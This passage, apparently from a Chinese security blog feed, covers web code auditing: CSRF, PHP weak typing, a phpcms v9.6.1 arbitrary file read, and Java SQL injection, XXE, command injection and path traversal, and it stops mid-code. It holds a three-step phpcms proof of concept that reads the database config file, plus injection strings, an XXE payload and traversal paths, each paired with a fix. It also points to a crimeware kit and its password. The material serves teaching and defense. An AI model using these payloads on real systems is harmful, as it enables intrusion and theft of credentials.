由于开发人员对CSRF的了解不足，错把”经过认证的浏览器发起的请求”当成”经过认证的用户发起的请求”，当已认证的用户点击攻击者构造的恶意链接后就”被”执行了相应的操作。 此类漏洞一般都会在框架中解决修复，所以在审计csrf漏洞时。首先要熟悉框架对CSRF的防护方案，一般审计时可查看增删改请求重是否有token、formtoken等关键字以及是否有对请求的Referer有进行校验。手动测试时,如果有token等关键则替换token值为自定义值并重放请求，如果没有则替换请求Referer头为自定义链接或置空。重放请求看是否可以成功返回数据从而判断是否存在CSRF漏洞。 应用场景：编辑文章，修改密码等 修复方案： Referer校验，对HTTP请求的Referer校验，如果请求Referer的地址不在允许的列表中，则拦截请求。 Token校验，服务端生成随机token，并保存在本次会话cookie中，用户发起请求时附带token参数，服务端对该随机数进行校验。如果不正确则认为该请求为伪造请求拒绝该请求。 Formtoken校验，Formtoken校验本身也是Token校验，只是在本次表单请求有效。 对于高安全性操作则可使用验证码、短信、密码等二次校验措施 增删改请求使用POST请求 二次漏洞攻击者提交的恶意的代码不是直接通过一个变量提交漏洞函数而是通过变量转化或者中转，最终提交到漏洞函数，例如通过SQL注射漏洞转化、通过编码/解码中转变量、或者其他方式等等。 比如先将用户提交的数据储存进数据库，然后再读取数据库中的数据传入命令执行或者文件读取的函数中去，造成漏洞的产生等等。 应用场景：多样化。 修复方案：在处理逻辑上进行分析，在交给敏感函数处理之前严格校验。 第三方组件安全这个比较好理解，诸如Struts2、不安全的编辑控件、XML解析器以及可被其它漏洞利用的如commons-collections:3.1等第三方组件，这个可以在程序pom文件中查看是否有引入依赖。即便在代码中没有应用到或很难直接利用，也不应该使用不安全的版本，一个产品的周期很长，很难保证后面不会引入可被利用的漏洞点。 修复方案：使用最新或安全版本的第三方组件。 弱类型PHP 的弱类型问题由来已久, 出现这些问题的，具体原因其实有很多，除了 intval 之类的类型转换，也有其他的。 PHP使用strcmp比较图： 12345678910&lt;?php// PHPif(in_array($_GET[&apos;id&apos;], array(1,2,3,4)))&#123; $sql = &quot;SELECT name from user Where id = &apos;&quot;.$_GET[&apos;id&apos;].&quot;&apos;&quot;; echo $sql;&#125;// in_array() : 比较之前会自动转换类型// ?id=1&apos; union select &apos;1 再比如：双等于== 和三等于=== 的问题：双等于会在变量比较时，进行类转换，与in_array() 是一样的问题。三等于是type和value的双重比较，相比之下更加安全。 其他最后还有其他临时想到的安全问题： 对不可信的字符串进行正则匹配造成的DOS. 代码中的敏感信息（数据库密码、密钥）直接以硬编码的形式写进代码、配置文件中。 日志拼接时将用户可控的字符直接输出。 异常处理不好导致信息泄露。 …… 练习对于代码审计的入门，可先实践一遍Damn Vulnerable Web App（DVWA）和Sibria Exploit Kit的漏洞发掘与利用。 DVWA是基于PHP并汇总了各类漏洞的一套测试环境，在其中能够看到Web应用中许多常见的错误。Siberia Exploit Kit是一个被许多犯罪份子用来完成大量攻击的”犯罪套件”，它包括了一个浏览器利用包和一个用来管理受害主机的控制面板。Siberia包含的几种基于POST的身份认证漏洞允许攻击者获得管理员权限并接管服务器所在的主机。 OWASP Broken Web Apps Siberia Crimeware Pack口令: infected 之后便可去网上寻找下载CMS等进行进一步的学习。 案例这里附一个大佬们挖出的漏洞phpcms v9.6.1任意文件读取漏洞 在phpcms中，有一个file_down函数用来下载文件的，该函数位于/phpcms/libs/functions/global.func.php: 123456789101112131415161718function file_down($filepath, $filename = '') &#123; if(!$filename) $filename = basename($filepath); if(is_ie()) $filename = rawurlencode($filename); $filetype = fileext($filename); $filesize = sprintf("%u", filesize($filepath)); if(ob_get_length() !== false) @ob_end_clean(); header('Pragma: public'); header('Last-Modified: '.gmdate('D, d M Y H:i:s') . ' GMT'); header('Cache-Control: no-store, no-cache, must-revalidate'); header('Cache-Control: pre-check=0, post-check=0, max-age=0'); header('Content-Transfer-Encoding: binary'); header('Content-Encoding: none'); header('Content-type: '.$filetype); header('Content-Disposition: attachment; filename="'.$filename.'"'); header('Content-length: '.$filesize); readfile($filepath); exit;&#125; 而调用他的地方是： 该函数就是一个正常的文件下载的函数，而调用这个函数的地方位于phpcms\modules\content\down.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123class down &#123; // ...... public function init() &#123; $a_k = trim($_GET['a_k']); if(!isset($a_k)) showmessage(L('illegal_parameters')); $a_k = sys_auth($a_k, 'DECODE', pc_base::load_config('system','auth_key')); if(empty($a_k)) showmessage(L('illegal_parameters')); unset($i,$m,$f); $a_k = safe_replace($a_k); parse_str($a_k); if(isset($i)) $i = $id = intval($i); if(!isset($m)) showmessage(L('illegal_parameters')); if(!isset($modelid)||!isset($catid)) showmessage(L('illegal_parameters')); if(empty($f)) showmessage(L('url_invalid')); $allow_visitor = 1; $id = intval($id); $modelid = intval($modelid); $catid = intval($catid); $MODEL = getcache('model','commons'); $tablename = $this-&gt;db-&gt;table_name = $this-&gt;db-&gt;db_tablepre.$MODEL[$modelid]['tablename']; $this-&gt;db-&gt;table_name = $tablename.'_data'; $rs = $this-&gt;db-&gt;get_one(array('id'=&gt;$id)); $siteids = getcache('category_content','commons'); $siteid = $siteids[$catid]; $CATEGORYS = getcache('category_content_'.$siteid,'commons'); $this-&gt;category = $CATEGORYS[$catid]; $this-&gt;category_setting = string2array($this-&gt;category['setting']); //检查文章会员组权限 $groupids_view = ''; if ($rs['groupids_view']) $groupids_view = explode(',', $rs['groupids_view']); if($groupids_view &amp;&amp; is_array($groupids_view)) &#123; $_groupid = param::get_cookie('_groupid'); $_groupid = intval($_groupid); if(!$_groupid) &#123; $forward = urlencode(get_url()); showmessage(L('login_website'),APP_PATH.'index.php?m=member&amp;c=index&amp;a=login&amp;forward='.$forward); &#125; if(!in_array($_groupid,$groupids_view)) showmessage(L('no_priv')); &#125; else &#123; //根据栏目访问权限判断权限 $_priv_data = $this-&gt;_category_priv($catid); if($_priv_data=='-1') &#123; $forward = urlencode(get_url()); showmessage(L('login_website'),APP_PATH.'index.php?m=member&amp;c=index&amp;a=login&amp;forward='.$forward); &#125; elseif($_priv_data=='-2') &#123; showmessage(L('no_priv')); &#125; &#125; //阅读收费 类型 $paytype = $rs['paytype']; $readpoint = $rs['readpoint']; if($readpoint || $this-&gt;category_setting['defaultchargepoint']) &#123; if(!$readpoint) &#123; $readpoint = $this-&gt;category_setting['defaultchargepoint']; $paytype = $this-&gt;category_setting['paytype']; &#125; //检查是否支付过 $allow_visitor = self::_check_payment($catid.'_'.$id,$paytype,$catid); if(!$allow_visitor) &#123; $http_referer = urlencode(get_url()); $allow_visitor = sys_auth($catid.'_'.$id.'|'.$readpoint.'|'.$paytype).'&amp;http_referer='.$http_referer; &#125; else &#123; $allow_visitor = 1; &#125; &#125; if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$f) || strpos($f, ":\\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error')); if(strpos($f, 'http://') !== FALSE || strpos($f, 'ftp://') !== FALSE || strpos($f, '://') === FALSE) &#123; $pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down'); $a_k = urlencode(sys_auth("i=$i&amp;d=$d&amp;s=$s&amp;t=".SYS_TIME."&amp;ip=".ip()."&amp;m=".$m."&amp;f=$f&amp;modelid=".$modelid, 'ENCODE', $pc_auth_key)); $downurl = '?m=content&amp;c=down&amp;a=download&amp;a_k='.$a_k; &#125; else &#123; $downurl = $f; &#125; include template('content','download'); &#125; public function download() &#123; $a_k = trim($_GET['a_k']); $pc_auth_key = md5(pc_base::load_config('system','auth_key').$_SERVER['HTTP_USER_AGENT'].'down'); $a_k = sys_auth($a_k, 'DECODE', $pc_auth_key); if(empty($a_k)) showmessage(L('illegal_parameters')); unset($i,$m,$f,$t,$ip); $a_k = safe_replace($a_k); parse_str($a_k); if(isset($i)) $downid = intval($i); if(!isset($m)) showmessage(L('illegal_parameters')); if(!isset($modelid)) showmessage(L('illegal_parameters')); if(empty($f)) showmessage(L('url_invalid')); if(!$i || $m&lt;0) showmessage(L('illegal_parameters')); if(!isset($t)) showmessage(L('illegal_parameters')); if(!isset($ip)) showmessage(L('illegal_parameters')); $starttime = intval($t); if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$f) || strpos($f, ":\\")!==FALSE || strpos($f,'..')!==FALSE) showmessage(L('url_error')); $fileurl = trim($f); if(!$downid || empty($fileurl) || !preg_match("/[0-9]&#123;10&#125;/", $starttime) || !preg_match("/[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;\.[0-9]&#123;1,3&#125;/", $ip) || $ip != ip()) showmessage(L('illegal_parameters')); $endtime = SYS_TIME - $starttime; if($endtime &gt; 3600) showmessage(L('url_invalid')); if($m) $fileurl = trim($s).trim($fileurl); if(preg_match('/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i',$fileurl) ) showmessage(L('url_error')); //远程文件 if(strpos($fileurl, ':/') &amp;&amp; (strpos($fileurl, pc_base::load_config('system','upload_url')) === false)) &#123; header("Location: $fileurl"); &#125; else &#123; if($d == 0) &#123; header("Location: ".$fileurl); &#125; else &#123; $fileurl = str_replace(array(pc_base::load_config('system','upload_url'),'/'), array(pc_base::load_config('system','upload_path'),DIRECTORY_SEPARATOR), $fileurl); $filename = basename($fileurl); //处理中文文件 if(preg_match("/^([\s\S]*?)([\x81-\xfe][\x40-\xfe])([\s\S]*?)/", $fileurl)) &#123; $filename = str_replace(array("%5C", "%2F", "%3A"), array("\\", "/", ":"), urlencode($fileurl)); $filename = urldecode(basename($filename)); &#125; $ext = fileext($filename); $filename = date('Ymd_his').random(3).'.'.$ext; $fileurl = str_replace(array('&lt;','&gt;'), '',$fileurl); file_down($fileurl, $filename); &#125; &#125; &#125; // ...... /phpcms/libs/functions/global.func.php函数 12345678910111213141516function safe_replace($string) &#123; $string = str_replace('%20','',$string); $string = str_replace('%27','',$string); $string = str_replace('%2527','',$string); $string = str_replace('*','',$string); $string = str_replace('"','&amp;quot;',$string); $string = str_replace("'",'',$string); $string = str_replace('"','',$string); $string = str_replace(';','',$string); $string = str_replace('&lt;','&amp;lt;',$string); $string = str_replace('&gt;','&amp;gt;',$string); $string = str_replace("&#123;",'',$string); $string = str_replace('&#125;','',$string); $string = str_replace('\\','',$string); return $string;&#125; 把其他无关代码去掉，就是下面这样： 12345678910111213141516171819202122init()&#123; $a_k = trim($_GET[&apos;a_k&apos;]); $a_k = sys_auth($a_k, &apos;DECODE&apos;, pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;)); $a_k = safe_replace($a_k); parse_str($a_k); $pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).$_SERVER[&apos;HTTP_USER_AGENT&apos;].&apos;down&apos;); $a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &apos;ENCODE&apos;, $pc_auth_key)); $downurl = &apos;?m=content&amp;c=down&amp;a=download&amp;a_k=&apos;.$a_k; down();&#125;download()&#123; $a_k = trim($_GET[&apos;a_k&apos;]); $pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).$_SERVER[&apos;HTTP_USER_AGENT&apos;].&apos;down&apos;); $a_k = sys_auth($a_k, &apos;DECODE&apos;, $pc_auth_key); $a_k = safe_replace($a_k); parse_str($a_k); // 函数用于把查询字符串解析到变量中，如果没有array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 $fileurl = trim($f); if($m) $fileurl = trim($s).trim($fileurl); if(preg_match(&apos;/(php|phtml|php3|php4|jsp|dll|asp|cer|asa|shtml|shtm|aspx|asax|cgi|fcgi|pl)(\.|$)/i&apos;,$fileurl) ) showmessage(L(&apos;url_error&apos;)); $fileurl = str_replace(array(&apos;&lt;&apos;,&apos;&gt;&apos;), &apos;&apos;,$fileurl); file_down($fileurl, $filename);&#125; 注意点： php原生parse_str方法，会自动进行一次urldecode，第二个参数为空，则执行类似extract操作。 原生empty方法，对字符串””返回true。 phpcms中sys_auth是对称加密且在不知道auth_key的情况下理论上不可能构造出有效密文。 具体分析如下： 参数由$_GET[&#39;a_k&#39;]传入，经过safe_replace安全检查后,解析变量，然后检查后缀名，最后去除&lt;,&gt;这些符号，最终运行下载函数。最终$_GET[&#39;a_k&#39;]传入pad=x&amp;i=1&amp;modelid=1&amp;catid=1&amp;d=1&amp;m=1&amp;f=.p&lt;hp&amp;s=index&amp;pade=由于safe_replce的存在所以&lt;会被过滤掉，前置知识中我已经说到parse_str会自动urldecode一次。所以可以构造pad=x&amp;i=1&amp;modelid=1&amp;catid=1&amp;d=1&amp;m=1&amp;f=.p%3chp&amp;s=index&amp;pade=我们发现在init方法中会safe_replace一次，和parse_str一次。那么最终编码到download $a_k中的数据实际还是&lt;，而download方法中也会safe_replace和parse_str一次。所以我们要确保在init方法编码的时候是%3c即可，对%3c进行一次urlencode，构造d=1&amp;m=1&amp;f=.p%253chp&amp;s=index当然要读取别的目录的，那同样对目录路径进行编码。最终poc： 第一步：获取一个身份 请求http://127.0.0.1:80/phpcms/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1获取一个身份。 第二步：获取加密值 请求http://127.0.0.1:80/phpcms/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dcaches/configs/database%26f%3D.p%25253chp POST： userid_flash = _siteid 第三步：获取加密值 请求http://127.0.0.1:80/phpcms/index.php?m=content&amp;c=down&amp;a=init&amp;a_k= + _att_json 总结随着开发人员的安全意识的不断提高，Web应用的安全机制也不断的增加，从代码上一眼就能看出的漏洞已经越来越少了，想要找出漏洞更需要对代码、框架的进一步理解，分析，例如：文章总的来说，不管是什么漏洞，在哪里出现，它们都有一个共同点，那就是危险函数中使用了可控参数，这些参数可被恶意用户直接或者间接控制，从函数中传进来，或者经过简单的编码，截断等处理直接进入危险函数，导致了危险行为。如果在执行危险函数前对这些可控参数进行一定判断，如必须是数字，路径必须存在，去掉某些特殊符号等则避免了问题的出现。 参考文章-1参考文章-2参考文章-3参考文章-4参考文章-5参考文章-6参考文章-7参考文章-8参考文章-9参考文章-10]]></content>
      <categories>
        <category>code audit</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>code audit</tag>
        <tag>java</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[代码审计(Java)]]></title>
    <url>%2F2018%2F01%2F17%2Fcode-audit-java%2F</url>
    <content type="text"><![CDATA[概述由于工作需要，开始接触代码审计的相关工作。因为之前对这方面并没有很清晰的概念，所以特地学习下 Web应用安全的核心问题用户提交的数据不可信是Web应用程序核心安全问题。 SQL注入原理合法输入12id=1SELECT * FROM users WHRER id=&apos;1&apos;; 恶意输入12id=1&apos; or &apos;1&apos;=&apos;1SELECT * FROM users WHRER id=&apos;1&apos; or &apos;a&apos;=&apos;a&apos;; Java代码分析不合规代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667public class SQLInject &#123; public static void main(String[] args)throws Exception&#123; //正常输入 select(&quot;1&quot;); // 恶意输入 select(&quot;&apos; or &apos;a&apos;=&apos;a&quot;); &#125; public static void select(String id)&#123; if (id!=null&amp;&amp;!id.isEmpty())&#123; //声明Connection对象 Connection con; //驱动程序名 String driver = &quot;com.mysql.jdbc.Driver&quot;; //URL指向要访问的数据库名mydata String url = &quot;jdbc:mysql://localhost:3306/test&quot;; //MySQL配置时的用户名 String user = &quot;root&quot;; //MySQL配置时的密码 String password = &quot;123456&quot;; //遍历查询结果集 try &#123; //加载驱动程序 Class&lt;?&gt; aClass = Class.forName(driver); //1.getConnection()方法，连接MySQL数据库！！ con = DriverManager.getConnection(url,user,password); if(!con.isClosed()) &#123; //2.创建statement类对象，用来执行SQL语句！！ Statement statement = con.createStatement(); //要执行的SQL语句 String sql = &quot;select * from users where id=&apos;&quot; + id + &quot;&apos;&quot;; //3.ResultSet类，用来存放获取的结果集！！ ResultSet rs = statement.executeQuery(sql); System.out.println(&quot;-----------------&quot;); System.out.println(&quot;执行Sql语句: &quot;+sql); System.out.println(&quot;执行结果如下所示:&quot;); String name, uname; while (rs.next()) &#123; //获取stuname这列数据 uname = rs.getString(&quot;uname&quot;); //获取stuid这列数据 name = rs.getString(&quot;name&quot;); //输出结果 System.out.println(uname + &quot;\t&quot; + name); res.add(new String[]&#123;&quot;id: &quot;+rs.getString(&quot;id&quot;) + &quot;,uname:&quot;+rs.getString(&quot;uname&quot;) + &quot;,passwd:&quot;+rs.getString(&quot;passwd&quot;) + &quot;,name:&quot;+rs.getString(&quot;name&quot;)&#125; ); &#125; rs.close(); con.close(); &#125; &#125; catch(ClassNotFoundException e) &#123; //数据库驱动类异常处理 e.printStackTrace(); &#125; catch(SQLException e) &#123; //数据库连接失败异常处理 e.printStackTrace(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; result.put(&quot;data&quot;,res); result.put(&quot;success&quot;,true); return DataUtil.toJson(result); &#125; &#125;&#125; 123456SQL Paramter:1-----------------执行Sql语句: select * from users where id=&apos;1&apos;执行结果如下所示:test Alice----------------- 12345678SQL Paramter:&apos; or &apos;a&apos;=&apos;a-----------------执行Sql语句:select * from users where id=&apos;1&apos; or &apos;a&apos;=&apos;a&apos;执行结果如下所示:test Aliceadmin Orlevenuser Bob----------------- 合规代码（参数化查询）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061public class SQLFormat &#123; public static void main(String[] args)throws Exception&#123; select(&quot;1&quot;); select(&quot;&apos; or &apos;a&apos;=&apos;a&quot;); &#125; public static void select(String id)&#123; if (id!=null&amp;&amp;!id.isEmpty())&#123; //声明Connection对象 Connection con; //驱动程序名 String driver = &quot;com.mysql.jdbc.Driver&quot;; //URL指向要访问的数据库名mydata String url = &quot;jdbc:mysql://localhost:3306/test&quot;; //MySQL配置时的用户名 String user = &quot;root&quot;; //MySQL配置时的密码 String password = &quot;123456&quot;; //遍历查询结果集 try &#123; //加载驱动程序 Class&lt;?&gt; aClass = Class.forName(driver); //1.getConnection()方法，连接MySQL数据库！！ con = DriverManager.getConnection(url,user,password); if(!con.isClosed()) &#123; //要执行的SQL语句 String sql = &quot;select * from users where id=?&quot;; //创建statement类对象，ResultSet类，用来存放获取的结果集！！ PreparedStatement stmt = con.prepareStatement(sql); stmt.setString(1, id); ResultSet rs = stmt.executeQuery(); System.out.println(&quot;-----------------&quot;); System.out.println(&quot;执行Sql语句: &quot;+stmt.toString()); System.out.println(&quot;执行结果如下所示:&quot;); String uname,name; while (rs.next()) &#123; //获取stuname这列数据 uname = rs.getString(&quot;uname&quot;); //获取stuid这列数据 name = rs.getString(&quot;name&quot;); //输出结果 System.out.println(uname + &quot;\t&quot; + name); &#125; rs.close(); con.close(); &#125; &#125; catch(ClassNotFoundException e) &#123; //数据库驱动类异常处理 e.printStackTrace(); &#125; catch(SQLException e) &#123; //数据库连接失败异常处理 e.printStackTrace(); &#125;catch (Exception e) &#123; e.printStackTrace(); &#125; result.put(&quot;data&quot;,res); result.put(&quot;success&quot;,true); return DataUtil.toJson(result); &#125; &#125;&#125; 12345SQL Paramter:1-----------------执行Sql语句: select * from users where id=&apos;1&apos;执行结果如下所示:test Alice 至于为什么还有1个查询结果，那就是Mysql的字符特性的问题了，这里不作多的解释。12345SQL Paramter:&apos; or &apos;a&apos;=&apos;a-----------------执行Sql语句: select * from users where id=&apos;1\&apos; or \&apos;a\&apos;=\&apos;a&apos;执行结果如下所示:test Alice 防范建议 采用参数查询即预编译方式（首选） 字符串过滤 XXE原理合法输入123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;users&gt; &lt;user&gt; &lt;id&gt;1&lt;/id&gt; &lt;uname&gt;test&lt;/uname&gt; &lt;passwd&gt;e10adc3949ba59abbe56e057f20f883e&lt;/passwd&gt; &lt;name&gt;Alice&lt;/name&gt; &lt;/user&gt;&lt;/users&gt; 1&#123;&quot;id&quot;:&quot;1&quot;,&quot;uname&quot;:&quot;test&quot;,&quot;passwd&quot;:&quot;e10adc3949ba59abbe56e057f20f883e&quot;,&quot;name&quot;:&quot;Alice&quot;&#125; 恶意输入1234567&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE xdsec [&lt;!ELEMENT methodname ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;http://localhost/text.txt&quot; &gt;]&gt;&lt;methodcall&gt;&lt;methodname&gt;%26xxe;&lt;/methodname&gt;&lt;/methodcall&gt; 本地80端口WEB服务器收到如下请求： 12345127.0.0.1 - - [08/Jan/2018:17:03:27 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot;127.0.0.1 - - [08/Jan/2018:17:03:28 +0800] &quot;GET /text.txt HTTP/1.1&quot; 404 1053 &quot;-&quot; &quot;Java/1.8.0_51&quot; Java代码分析不合规代码1234567891011121314151617181920212223242526272829public class XMlXXEFormat &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;&quot;; XMlXXEInject(data); &#125; public String XMlXXEInject(String data)&#123; Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); List&lt;User&gt; res = new ArrayList(); result.put(&quot;success&quot;,false); if (data!=null&amp;&amp;!data.isEmpty())&#123; // 获取基于SAX的解析器的实例 try &#123; System.out.println(data); SAXParserFactory factory = SAXParserFactory.newInstance(); // 2.创建一个SAXParser实例 SAXParser saxParser = factory.newSAXParser(); // 3.解析 MySaxHandler myhandler = new MySaxHandler(); saxParser.parse(new ByteArrayInputStream(data.getBytes()), myhandler); res = myhandler.getUserList(); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; result.put(&quot;data&quot;, res); System.out.println(DataUtil.toJson(result)); &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132public class XMlXXEFormat &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;&quot;; XMlXXEInject(data); &#125; public String XMlXXEInject(String data)&#123; Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); List&lt;User&gt; res = new ArrayList(); result.put(&quot;success&quot;,false); if (data!=null&amp;&amp;!data.isEmpty())&#123; // 获取基于SAX的解析器的实例 try &#123; System.out.println(data); SAXParserFactory factory = SAXParserFactory.newInstance(); factory.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;, true); factory.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;, false); factory.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;, false); // 2.创建一个SAXParser实例 SAXParser saxParser = factory.newSAXParser(); // 3.解析 MySaxHandler myhandler = new MySaxHandler(); saxParser.parse(new ByteArrayInputStream(data.getBytes()), myhandler); res = myhandler.getUserList(); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; result.put(&quot;data&quot;, res); System.out.println(DataUtil.toJson(result)); &#125;&#125; 报错如下：1org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 50; 将功能 &quot;http://apache.org/xml/features/disallow-doctype-decl&quot; 设置为“真”时, 不允许使用 DOCTYPE。 防范建议 使用开发语言提供的禁用外部实体的方法（首选） 过滤用户提交的XML数据，关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。 命令注入原理合法输入128.8.8.8ping -n/-c 1 8.8.8.8 恶意输入128.8.8.8 &amp; whoamiping -n/-c 1 8.8.8.8 &amp; whoami Java代码分析不合规代码123456789101112131415161718192021222324252627282930313233343536373839public class ExecTestController &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;8.8.8.8 &amp; ipconfig/all &quot;; ExecInject(data); &#125; public String ExecInject(HttpServletRequest request)&#123; String command = request.getParameter(&quot;command&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); StringBuffer buffer = null; if (command!=null&amp;&amp;!command.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; System.out.println(&quot;Command: ping&quot;+ command); Runtime rt = Runtime.getRuntime(); Process proc = rt.exec(&quot;cmd.exe /C ping &quot;+command); // Process proc = rt.exec(new String [] &#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls &quot;+order&#125;); int res = proc.waitFor(); if(res !=0)&#123; System.out.println(&quot;process error: &quot;+ res); &#125; InputStream in = (res == 0)? proc.getInputStream() : proc.getErrorStream(); BufferedReader reader=new BufferedReader(new InputStreamReader(in)); buffer=new StringBuffer(); String line; while((line = reader.readLine())!=null)&#123; buffer.append(line+&quot;\n&quot;); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; System.out.print(buffer.toString()); &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132333435363738394041424344public class ExecTestController &#123; public static void main(String[] args)throws Exception&#123; String data = &quot;8.8.8.8 &amp; ipconfig/all &quot;; ExecFormat(data); &#125; public String ExecFormat(HttpServletRequest request)&#123; String command = request.getParameter(&quot;command&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); StringBuffer buffer = null; if (command!=null&amp;&amp;!command.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; // 严格校验参数 if (!Pattern.matches(&quot;[A-Za-z@.]+&quot;, command))&#123; ; result.put(&quot;message&quot;, &quot;Error!&quot;); return DataUtil.toJson(result); &#125; System.out.println(&quot;Command: ping&quot;+ command); Runtime rt = Runtime.getRuntime(); Process proc = rt.exec(&quot;cmd.exe /C ping &quot;+command); // Process proc = rt.exec(new String [] &#123;&quot;sh&quot;, &quot;-c&quot;, &quot;ls &quot;+order&#125;); int res = proc.waitFor(); if(res !=0)&#123; System.out.println(&quot;process error: &quot;+ res); &#125; InputStream in = (res == 0)? proc.getInputStream() : proc.getErrorStream(); BufferedReader reader=new BufferedReader(new InputStreamReader(in)); buffer=new StringBuffer(); String line; while((line = reader.readLine())!=null)&#123; buffer.append(line+&quot;\n&quot;); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; System.out.print(buffer.toString()); &#125;&#125; 防范建议 白名单 严格权限限制等等 严格校验参数 任意文件下载/目录遍历原理在JAVA web程序的下载文件相关的代码中，若不对HTTP请求中的待下载文件名进行检查，则有可能产生任意文件下载漏洞。目录遍历与任意文件下载的原理相似，这里就简单列个文件下载好了 合法输入12path=users.docsconfig/users.docs 恶意输入12path=../../../../Windows/System32/drivers/etc/HOSTSconfig/../../../../Windows/System32/drivers/etc/HOSTS Java代码分析不合规代码12345678910111213141516171819202122232425262728293031323334353637383940414243public class FileTestController &#123; public void FileFileDownVul(HttpServletRequest request,HttpServletResponse response)&#123; String path = request.getParameter(&quot;path&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); if (path!=null&amp;&amp;!path.isEmpty())&#123; // 1.获取基于SAX的解析器的实例 try &#123; path = &quot;config/&quot;+path; File file = new File(path); System.out.println(path); response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\&quot;&quot; + new String(path.getBytes(), &quot;ISO8859-1&quot;) + &quot;\&quot;&quot;); response.setContentLength((int) file.length()); byte[] buffer = new byte[4096];// 缓冲区 BufferedOutputStream output = null; BufferedInputStream input = null; try &#123; output = new BufferedOutputStream(response.getOutputStream()); input = new BufferedInputStream(new FileInputStream(file)); int n = -1; //遍历，开始下载 while ((n = input.read(buffer, 0, 4096)) &gt; -1) &#123; output.write(buffer, 0, n); &#125; output.flush(); //不可少 response.flushBuffer();//不可少 &#125; catch (Exception e) &#123; //异常自己捕捉 &#125; finally &#123; //关闭流，不可少 if (input != null) input.close(); if (output != null) output.close(); &#125; &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; &#125;&#125; 合规代码1234567891011121314151617181920212223242526272829303132333435363738394041424344public class FileTestController &#123; public void FileFileDownFormat(HttpServletRequest request,HttpServletResponse response)&#123; String path = request.getParameter(&quot;path&quot;); Map&lt;String,Object&gt; result = new HashMap&lt;&gt;(); result.put(&quot;success&quot;,false); if (path!=null&amp;&amp;!path.isEmpty())&#123; try &#123; if (!Pattern.matches(&quot;^([a-z0-9]&#123;32&#125;)$&quot;, path))&#123; ; return ; &#125; path = &quot;config/&quot;+path+&quot;.docx&quot;; File file = new File(path); System.out.println(path); response.setHeader(&quot;Content-Disposition&quot;, &quot;attachment;filename=\&quot;&quot; + new String(path.getBytes(), &quot;ISO8859-1&quot;) + &quot;\&quot;&quot;); response.setContentLength((int) file.length()); byte[] buffer = new byte[4096];// 缓冲区 BufferedOutputStream output = null; BufferedInputStream input = null; try &#123; output = new BufferedOutputStream(response.getOutputStream()); input = new BufferedInputStream(new 